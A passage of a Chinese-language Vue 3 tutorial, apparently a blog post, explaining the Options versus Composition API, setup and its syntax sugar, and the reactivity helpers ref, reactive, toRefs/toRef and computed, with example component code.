@click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;年龄+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;showTel&quot;&gt;点我查看联系方式&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#x27;App&#x27;,</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        name:&#x27;张三&#x27;,</span><br><span class="line">        age:18,</span><br><span class="line">        tel:&#x27;13888888888&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      changeName()&#123;</span><br><span class="line">        this.name = &#x27;zhang-san&#x27;</span><br><span class="line">      &#125;,</span><br><span class="line">      changeAge()&#123;</span><br><span class="line">        this.age += 1</span><br><span class="line">      &#125;,</span><br><span class="line">      showTel()&#123;</span><br><span class="line">        alert(this.tel)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1>3. Vue3核心语法</h1><h2 id="3-1-【OptionsAPI-与-CompositionAPI】">3.1.  【OptionsAPI 与 CompositionAPI】</h2><ul><li><code>Vue2</code>的<code>API</code>设计是<code>Options</code>（配置）风格的。</li><li><code>Vue3</code>的<code>API</code>设计是<code>Composition</code>（组合）风格的。</li></ul><h3 id="Options-API-的弊端">Options API 的弊端</h3><p><code>Options</code>类型的 <code>API</code>，数据、方法、计算属性等，是分散在：<code>data</code>、<code>methods</code>、<code>computed</code>中的，若想新增或者修改一个需求，就需要分别修改：<code>data</code>、<code>methods</code>、<code>computed</code>，不便于维护和复用。</p><p><img src="images/1696662197101-55d2b251-f6e5-47f4-b3f1-d8531bbf9279.gif" alt="1.gif" style="zoom:70%;border-radius:20px" /><img src="images/1696662200734-1bad8249-d7a2-423e-a3c3-ab4c110628be.gif" alt="2.gif" style="zoom:70%;border-radius:20px" /></p><h3 id="Composition-API-的优势">Composition API 的优势</h3><p>可以用函数的方式，更加优雅的组织代码，让相关功能的代码更加有序的组织在一起。</p><p><img src="images/1696662249851-db6403a1-acb5-481a-88e0-e1e34d2ef53a.gif" alt="3.gif" style="height:300px;border-radius:10px"  /><img src="images/1696662256560-7239b9f9-a770-43c1-9386-6cc12ef1e9c0.gif" alt="4.gif" style="height:300px;border-radius:10px"  /></p><blockquote><p>说明：以上四张动图原创作者：大帅老猿</p></blockquote><h2 id="3-2-【拉开序幕的-setup】">3.2. 【拉开序幕的 setup】</h2><h3 id="setup-概述">setup 概述</h3><p><code>setup</code>是<code>Vue3</code>中一个新的配置项，值是一个函数，它是 <code>Composition API</code> <strong>“表演的舞台</strong><em><strong>”</strong></em>，组件中所用到的：数据、方法、计算属性、监视…等等，均配置在<code>setup</code>中。</p><p>特点如下：</p><ul><li><code>setup</code>函数返回的对象中的内容，可直接在模板中使用。</li><li><code>setup</code>中访问<code>this</code>是<code>undefined</code>。</li><li><code>setup</code>函数会在<code>beforeCreate</code>之前调用，它是“领先”所有钩子执行的。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;年龄+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;showTel&quot;&gt;点我查看联系方式&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#x27;Person&#x27;,</span><br><span class="line">    setup()&#123;</span><br><span class="line">      // 数据，原来写在data中（注意：此时的name、age、tel数据都不是响应式数据）</span><br><span class="line">      let name = &#x27;张三&#x27;</span><br><span class="line">      let age = 18</span><br><span class="line">      let tel = &#x27;13888888888&#x27;</span><br><span class="line"></span><br><span class="line">      // 方法，原来写在methods中</span><br><span class="line">      function changeName()&#123;</span><br><span class="line">        name = &#x27;zhang-san&#x27; //注意：此时这么修改name页面是不变化的</span><br><span class="line">        console.log(name)</span><br><span class="line">      &#125;</span><br><span class="line">      function changeAge()&#123;</span><br><span class="line">        age += 1 //注意：此时这么修改age页面是不变化的</span><br><span class="line">        console.log(age)</span><br><span class="line">      &#125;</span><br><span class="line">      function showTel()&#123;</span><br><span class="line">        alert(tel)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // 返回一个对象，对象中的内容，模板中可以直接使用</span><br><span class="line">      return &#123;name,age,tel,changeName,changeAge,showTel&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="setup-的返回值">setup 的返回值</h3><ul><li>若返回一个<strong>对象</strong>：则对象中的：属性、方法等，在模板中均可以直接使用**（重点关注）。**</li><li>若返回一个<strong>函数</strong>：则可以自定义渲染内容，代码如下：</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">()=&gt;</span> <span class="string">&#x27;你好啊！&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="setup-与-Options-API-的关系">setup 与 Options API 的关系</h3><ul><li><code>Vue2</code> 的配置（<code>data</code>、<code>methos</code>…）中<strong>可以访问到</strong> <code>setup</code>中的属性、方法。</li><li>但在<code>setup</code>中<strong>不能访问到</strong><code>Vue2</code>的配置（<code>data</code>、<code>methos</code>…）。</li><li>如果与<code>Vue2</code>冲突，则<code>setup</code>优先。</li></ul><h3 id="setup-语法糖">setup 语法糖</h3><p><code>setup</code>函数有一个语法糖，这个语法糖，可以让我们把<code>setup</code>独立出去，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changAge&quot;&gt;年龄+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;showTel&quot;&gt;点我查看联系方式&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#x27;Person&#x27;,</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 下面的写法是setup语法糖 --&gt;</span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">  console.log(this) //undefined</span><br><span class="line">  </span><br><span class="line">  // 数据（注意：此时的name、age、tel都不是响应式数据）</span><br><span class="line">  let name = &#x27;张三&#x27;</span><br><span class="line">  let age = 18</span><br><span class="line">  let tel = &#x27;13888888888&#x27;</span><br><span class="line"></span><br><span class="line">  // 方法</span><br><span class="line">  function changName()&#123;</span><br><span class="line">    name = &#x27;李四&#x27;//注意：此时这么修改name页面是不变化的</span><br><span class="line">  &#125;</span><br><span class="line">  function changAge()&#123;</span><br><span class="line">    console.log(age)</span><br><span class="line">    age += 1 //注意：此时这么修改age页面是不变化的</span><br><span class="line">  &#125;</span><br><span class="line">  function showTel()&#123;</span><br><span class="line">    alert(tel)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>扩展：上述代码，还需要编写一个不写<code>setup</code>的<code>script</code>标签，去指定组件名字，比较麻烦，我们可以借助<code>vite</code>中的插件简化</p><ol><li>第一步：<code>npm i vite-plugin-vue-setup-extend -D</code></li><li>第二步：<code>vite.config.ts</code></li></ol><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueSetupExtend</span> <span class="keyword">from</span> <span class="string">&#x27;vite-plugin-vue-setup-extend&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [ <span class="title class_">VueSetupExtend</span>() ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="3"><li>第三步：<code>&lt;script setup lang=&quot;ts&quot; name=&quot;Person&quot;&gt;</code></li></ol><h2 id="3-3-【ref-创建：基本类型的响应式数据】">3.3. 【ref 创建：基本类型的响应式数据】</h2><ul><li>**作用：**定义响应式变量。</li><li><strong>语法：</strong><code>let xxx = ref(初始值)</code>。</li><li>**返回值：**一个<code>RefImpl</code>的实例对象，简称<code>ref对象</code>或<code>ref</code>，<code>ref</code>对象的<code>value</code><strong>属性是响应式的</strong>。</li><li><strong>注意点：</strong><ul><li><code>JS</code>中操作数据需要：<code>xxx.value</code>，但模板中不需要<code>.value</code>，直接使用即可。</li><li>对于<code>let name = ref('张三')</code>来说，<code>name</code>不是响应式的，<code>name.value</code>是响应式的。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;年龄+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;showTel&quot;&gt;点我查看联系方式&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">  // name和age是一个RefImpl的实例对象，简称ref对象，它们的value属性是响应式的。</span><br><span class="line">  let name = ref(&#x27;张三&#x27;)</span><br><span class="line">  let age = ref(18)</span><br><span class="line">  // tel就是一个普通的字符串，不是响应式的</span><br><span class="line">  let tel = &#x27;13888888888&#x27;</span><br><span class="line"></span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    // JS中操作ref对象时候需要.value</span><br><span class="line">    name.value = &#x27;李四&#x27;</span><br><span class="line">    console.log(name.value)</span><br><span class="line"></span><br><span class="line">    // 注意：name不是响应式的，name.value是响应式的，所以如下代码并不会引起页面的更新。</span><br><span class="line">    // name = ref(&#x27;zhang-san&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    // JS中操作ref对象时候需要.value</span><br><span class="line">    age.value += 1 </span><br><span class="line">    console.log(age.value)</span><br><span class="line">  &#125;</span><br><span class="line">  function showTel()&#123;</span><br><span class="line">    alert(tel)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-4-【reactive-创建：对象类型的响应式数据】">3.4. 【reactive 创建：对象类型的响应式数据】</h2><ul><li><strong>作用：<strong>定义一个</strong>响应式对象</strong>（基本类型不要用它，要用<code>ref</code>，否则报错）</li><li><strong>语法：</strong><code>let 响应式对象= reactive(源对象)</code>。</li><li>**返回值：**一个<code>Proxy</code>的实例对象，简称：响应式对象。</li><li><strong>注意点：</strong><code>reactive</code>定义的响应式数据是“深层次”的。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;汽车信息：一台&#123;&#123; car.brand &#125;&#125;汽车，价值&#123;&#123; car.price &#125;&#125;万&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;游戏列表：&lt;/h2&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;h2&gt;测试：&#123;&#123;obj.a.b.c.d&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeCarPrice&quot;&gt;修改汽车价格&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeFirstGame&quot;&gt;修改第一游戏&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;test&quot;&gt;测试&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">// 数据</span><br><span class="line">let car = reactive(&#123; brand: &#x27;奔驰&#x27;, price: 100 &#125;)</span><br><span class="line">let games = reactive([</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa01&#x27;, name: &#x27;英雄联盟&#x27; &#125;,</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa02&#x27;, name: &#x27;王者荣耀&#x27; &#125;,</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa03&#x27;, name: &#x27;原神&#x27; &#125;</span><br><span class="line">])</span><br><span class="line">let obj = reactive(&#123;</span><br><span class="line">  a:&#123;</span><br><span class="line">    b:&#123;</span><br><span class="line">      c:&#123;</span><br><span class="line">        d:666</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">function changeCarPrice() &#123;</span><br><span class="line">  car.price += 10</span><br><span class="line">&#125;</span><br><span class="line">function changeFirstGame() &#123;</span><br><span class="line">  games[0].name = &#x27;流星蝴蝶剑&#x27;</span><br><span class="line">&#125;</span><br><span class="line">function test()&#123;</span><br><span class="line">  obj.a.b.c.d = 999</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-5-【ref-创建：对象类型的响应式数据】">3.5. 【ref 创建：对象类型的响应式数据】</h2><ul><li>其实<code>ref</code>接收的数据可以是：<strong>基本类型</strong>、<strong>对象类型</strong>。</li><li>若<code>ref</code>接收的是对象类型，内部其实也是调用了<code>reactive</code>函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;汽车信息：一台&#123;&#123; car.brand &#125;&#125;汽车，价值&#123;&#123; car.price &#125;&#125;万&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;游戏列表：&lt;/h2&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;h2&gt;测试：&#123;&#123;obj.a.b.c.d&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeCarPrice&quot;&gt;修改汽车价格&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeFirstGame&quot;&gt;修改第一游戏&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;test&quot;&gt;测试&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">// 数据</span><br><span class="line">let car = ref(&#123; brand: &#x27;奔驰&#x27;, price: 100 &#125;)</span><br><span class="line">let games = ref([</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa01&#x27;, name: &#x27;英雄联盟&#x27; &#125;,</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa02&#x27;, name: &#x27;王者荣耀&#x27; &#125;,</span><br><span class="line">  &#123; id: &#x27;ahsgdyfa03&#x27;, name: &#x27;原神&#x27; &#125;</span><br><span class="line">])</span><br><span class="line">let obj = ref(&#123;</span><br><span class="line">  a:&#123;</span><br><span class="line">    b:&#123;</span><br><span class="line">      c:&#123;</span><br><span class="line">        d:666</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">console.log(car)</span><br><span class="line"></span><br><span class="line">function changeCarPrice() &#123;</span><br><span class="line">  car.value.price += 10</span><br><span class="line">&#125;</span><br><span class="line">function changeFirstGame() &#123;</span><br><span class="line">  games.value[0].name = &#x27;流星蝴蝶剑&#x27;</span><br><span class="line">&#125;</span><br><span class="line">function test()&#123;</span><br><span class="line">  obj.value.a.b.c.d = 999</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-6-【ref-对比-reactive】">3.6. 【ref 对比 reactive】</h2><p>宏观角度看：</p><blockquote><ol><li><p><code>ref</code>用来定义：<strong>基本类型数据</strong>、<strong>对象类型数据</strong>；</p></li><li><p><code>reactive</code>用来定义：<strong>对象类型数据</strong>。</p></li></ol></blockquote><ul><li>区别：</li></ul><blockquote><ol><li><p><code>ref</code>创建的变量必须使用<code>.value</code>（可以使用<code>volar</code>插件自动添加<code>.value</code>）。</p><img src="images/自动补充value.png" alt="自动补充value" style="zoom:50%;border-radius:20px" /> </li><li><p><code>reactive</code>重新分配一个新对象，会<strong>失去</strong>响应式（可以使用<code>Object.assign</code>去整体替换）。</p></li></ol></blockquote><ul><li>使用原则：</li></ul><blockquote><ol><li>若需要一个基本类型的响应式数据，必须使用<code>ref</code>。</li><li>若需要一个响应式对象，层级不深，<code>ref</code>、<code>reactive</code>都可以。</li><li>若需要一个响应式对象，且层级较深，推荐使用<code>reactive</code>。</li></ol></blockquote><h2 id="3-7-【toRefs-与-toRef】">3.7. 【toRefs 与 toRef】</h2><ul><li>作用：将一个响应式对象中的每一个属性，转换为<code>ref</code>对象。</li><li>备注：<code>toRefs</code>与<code>toRef</code>功能一致，但<code>toRefs</code>可以批量转换。</li><li>语法如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123;person.name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123;person.age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;性别：&#123;&#123;person.gender&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeGender&quot;&gt;修改性别&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,reactive,toRefs,toRef&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let person = reactive(&#123;name:&#x27;张三&#x27;, age:18, gender:&#x27;男&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">  // 通过toRefs将person对象中的n个属性批量取出，且依然保持响应式的能力</span><br><span class="line">  let &#123;name,gender&#125; =  toRefs(person)</span><br><span class="line"></span><br><span class="line">  // 通过toRef将person对象中的gender属性取出，且依然保持响应式的能力</span><br><span class="line">  let age = toRef(person,&#x27;age&#x27;)</span><br><span class="line"></span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    name.value += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    age.value += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changeGender()&#123;</span><br><span class="line">    gender.value = &#x27;女&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-8-【computed】">3.8. 【computed】</h2><p>作用：根据已有数据计算出新数据（和<code>Vue2</code>中的<code>computed</code>作用一致）。</p><img src="images/computed.gif" style="zoom:20%;" />  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br&gt;</span><br><span class="line">    名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; &lt;br&gt;</span><br><span class="line">    全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;changeFullName&quot;&gt;全名改为：li-si&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;App&quot;&gt;</span><br><span class="line">  import &#123;ref,computed&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  let firstName = ref(&#x27;zhang&#x27;)</span><br><span class="line">  let lastName = ref(&#x27;san&#x27;)</span><br><span class="line"></span><br><span class="line">  // 计算属性——只读取，不修改</span><br><span class="line">  /* let fullName = computed(()=&gt;&#123;</span><br><span class="line">    return firstName.value + &#x27;-&#x27; + lastName.value</span><br><span class="line">  &#125;) */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // 计算属性——既读取又修改</span><br><span class="line">  let fullName = computed(&#123;</span><br><span class="line">    // 读取</span><br><span class="line">    get()&#123;</span><br><span class="line">      return firstName.value + &#x27;-&#x27; + lastName.value</span><br><span class="line">    &#125;,</span><br><span class="line">    // 修改</span><br><span class="line">    set(val)&#123;</span><br><span class="line">      